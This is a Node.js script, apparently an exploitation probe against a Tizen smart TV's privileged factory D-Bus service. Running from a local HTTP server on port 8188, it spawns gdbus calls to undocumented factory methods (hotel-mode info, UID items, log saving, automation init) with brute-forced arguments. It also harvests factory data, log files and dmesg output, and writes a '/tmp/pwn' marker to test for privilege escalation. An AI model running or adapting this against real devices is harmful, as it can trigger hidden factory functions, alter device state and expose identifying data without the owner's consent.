'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8188;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe99h.txt';
var PWN = '/tmp/pwn99h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Pre-create pwn file
  'try { fs.writeFileSync("' + PWN + '", "pre\\n"); r.pwn_ok = true; } catch(e) {}',

  // 2. Full introspection — 10000 chars to get all methods
  'try {',
  '  var o_intr = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.freedesktop.DBus.Introspectable.Introspect"],{timeout:5000});',
  '  r.introspect_full = (o_intr.stdout||new Buffer(0)).toString().trim().slice(0,10000);',
  '} catch(e) { r.introspect_err = e.message.slice(0,60); }',

  // 3. Read /opt/data/org.tizen.factory/
  'try { r.opt_data_factory = fs.readdirSync("/opt/data/org.tizen.factory"); } catch(e) { r.opt_data_factory = "ERR:"+e.message.slice(0,50); }',
  // Try to read files inside it
  'r.opt_data_factory_files = {};',
  'try {',
  '  var fac_data_files = fs.readdirSync("/opt/data/org.tizen.factory");',
  '  if (fac_data_files && fac_data_files.length) {',
  '    fac_data_files.slice(0,20).forEach(function(f) {',
  '      try {',
  '        var st = fs.statSync("/opt/data/org.tizen.factory/"+f);',
  '        if (st.isDirectory()) {',
  '          try { r.opt_data_factory_files[f] = fs.readdirSync("/opt/data/org.tizen.factory/"+f).slice(0,20); } catch(e2) { r.opt_data_factory_files[f] = "DIR_ERR:"+e2.message.slice(0,40); }',
  '        } else {',
  '          try { r.opt_data_factory_files[f] = fs.readFileSync("/opt/data/org.tizen.factory/"+f,"utf8").slice(0,500); } catch(e2) { r.opt_data_factory_files[f] = "READ_ERR:"+e2.message.slice(0,40); }',
  '        }',
  '      } catch(e3) { r.opt_data_factory_files[f] = "STAT_ERR:"+e3.message.slice(0,40); }',
  '    });',
  '  }',
  '} catch(e) {}',

  // 4. Read /opt/share/org.tizen.factory/
  'try { r.opt_share_factory = fs.readdirSync("/opt/share/org.tizen.factory"); } catch(e) { r.opt_share_factory = "ERR:"+e.message.slice(0,50); }',
  'r.opt_share_factory_files = {};',
  'try {',
  '  var sf = fs.readdirSync("/opt/share/org.tizen.factory");',
  '  if (sf && sf.length) {',
  '    sf.slice(0,20).forEach(function(f) {',
  '      try {',
  '        var st2 = fs.statSync("/opt/share/org.tizen.factory/"+f);',
  '        if (st2.isDirectory()) {',
  '          try { r.opt_share_factory_files[f] = fs.readdirSync("/opt/share/org.tizen.factory/"+f).slice(0,20); } catch(e2) { r.opt_share_factory_files[f] = "DIR_ERR:"+e2.message.slice(0,40); }',
  '        } else {',
  '          try { r.opt_share_factory_files[f] = fs.readFileSync("/opt/share/org.tizen.factory/"+f,"utf8").slice(0,500); } catch(e2) { r.opt_share_factory_files[f] = "READ_ERR:"+e2.message.slice(0,40); }',
  '        }',
  '      } catch(e3) { r.opt_share_factory_files[f] = "STAT_ERR:"+e3.message.slice(0,40); }',
  '    });',
  '  }',
  '} catch(e) {}',

  // 5. /opt/var/log contents (system logs)
  'try { r.opt_var_log = fs.readdirSync("/opt/var/log"); } catch(e) { r.opt_var_log = "ERR:"+e.message.slice(0,50); }',
  // Try to read factory-related log files
  'r.opt_var_log_reads = {};',
  'try {',
  '  var vl = fs.readdirSync("/opt/var/log");',
  '  if (vl) {',
  '    vl.filter(function(f){ return f.indexOf("factory")>-1||f.indexOf("kfac")>-1||f.indexOf("tif")>-1||f.indexOf("upgrade")>-1; }).forEach(function(f) {',
  '      try { r.opt_var_log_reads[f] = fs.readFileSync("/opt/var/log/"+f,"utf8").slice(0,500); } catch(e2) { r.opt_var_log_reads[f] = "ERR:"+e2.message.slice(0,40); }',
  '    });',
  '  }',
  '} catch(e) {}',

  // 6. GetHotelModeInfo() — hotel mode data
  'try {',
  '  var o_hmi = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetHotelModeInfo"],{timeout:5000});',
  '  r.hotel_mode_info = (o_hmi.stdout||new Buffer(0)).toString().trim().slice(0,500);',
  '} catch(e) { r.hotel_mode_err = e.message.slice(0,60); }',

  // 7. DoJackPackFactoryDatasSync(key, year) — test various combos
  'r.jackpack = {};',
  'var jp_combos = [[0,0],[1,0],[2,0],[3,0],[0,2018],[1,2018],[0,2026],[255,0]];',
  'jp_combos.forEach(function(c) {',
  '  try {',
  '    var o_jp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.DoJackPackFactoryDatasSync",String(c[0]),String(c[1])],{timeout:8000});',
  '    r.jackpack["k"+c[0]+"y"+c[1]] = (o_jp.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  } catch(e) { r.jackpack["k"+c[0]+"y"+c[1]] = "ERR:"+e.message.slice(0,40); }',
  '});',

  // 8. GetUidItem(key, src, res) — try various combos
  'r.uid_items = {};',
  'var ui_combos = [[0,0,0],[1,0,0],[2,0,0],[3,0,0],[0,1,0],[0,0,1],[10,0,0],[100,0,0]];',
  'ui_combos.forEach(function(c) {',
  '  try {',
  '    var o_ui = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetUidItem",String(c[0]),String(c[1]),String(c[2])],{timeout:3000});',
  '    r.uid_items["k"+c[0]+"s"+c[1]+"r"+c[2]] = (o_ui.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  } catch(e) {}',
  '});',

  // 9. SaveLog(4..7) + check /opt/data/org.tizen.factory/ AFTER each
  'r.savelog_opt_check = {};',
  'for (var sl = 4; sl <= 7; sl++) {',
  '  try {',
  '    var o_sl = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SaveLog",String(sl)],{timeout:8000});',
  '    var slout = (o_sl.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '    r.savelog_opt_check["sl"+sl] = slout;',
  '    // Check for new files in /opt/data/org.tizen.factory/  ',
  '    try {',
  '      var after_sl = fs.readdirSync("/opt/data/org.tizen.factory");',
  '      r.savelog_opt_check["sl"+sl+"_factory_files"] = after_sl;',
  '    } catch(e3) {}',
  '    // Also check /opt/var/log',
  '    try {',
  '      var after_sl_log = fs.readdirSync("/opt/var/log");',
  '      r.savelog_opt_check["sl"+sl+"_varlog"] = after_sl_log.slice(0,20);',
  '    } catch(e4) {}',
  '  } catch(e) {}',
  '}',

  // 10. GetChildItem(6, 65..94) — last 30 Deleted items
  'r.deleted_65_94 = [];',
  'for (var i = 65; i <= 94; i++) {',
  '  try {',
  '    var o_del = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","6",String(i)],{timeout:3000});',
  '    r.deleted_65_94.push({ idx: i, data: (o_del.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 11. GetChildItem(9, 0..19) — WBMovie (58 children)
  'r.wbmovie_0_19 = [];',
  'for (var wm = 0; wm < 20; wm++) {',
  '  try {',
  '    var o_wm = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","9",String(wm)],{timeout:3000});',
  '    r.wbmovie_0_19.push({ idx: wm, data: (o_wm.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 12. GetChildItem(11, 0..19) — EPA (60 children)
  'r.epa_0_19 = [];',
  'for (var ep = 0; ep < 20; ep++) {',
  '  try {',
  '    var o_ep = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","11",String(ep)],{timeout:3000});',
  '    r.epa_0_19.push({ idx: ep, data: (o_ep.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 13. Try InitAutomationMovieWb() + dmesg
  'var dm_base = 0;',
  'try { dm_base = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n").length; } catch(e) {}',
  'try {',
  '  var o_amwb = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.InitAutomationMovieWb"],{timeout:8000});',
  '  r.init_automation_moviewb = (o_amwb.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.init_automation_moviewb_err = e.message.slice(0,60); }',
  'try {',
  '  var dm_amwb = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.init_automation_dmesg = dm_amwb.slice(dm_base).join("\\n").slice(0,500);',
  '  dm_base = dm_amwb.length;',
  '} catch(e) {}',

  // 14. /opt/share/logger/ and /opt/var/db/
  'try { r.opt_share_logger = fs.readdirSync("/opt/share/logger").slice(0,30); } catch(e) { r.opt_share_logger = "ERR:"+e.message.slice(0,50); }',
  'try { r.opt_var_db = fs.readdirSync("/opt/var/db").slice(0,20); } catch(e) { r.opt_var_db = "ERR:"+e.message.slice(0,50); }',

  // 15. pwn check + dmesg tail
  'try {',
  '  var dm_fin = cp.spawnSync("dmesg",[],{timeout:3000});',
  '  r.dmesg_tail15 = (dm_fin.stdout||new Buffer(0)).toString().split("\\n").slice(-15).join("\\n").slice(0,1000);',
  '} catch(e) {}',
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
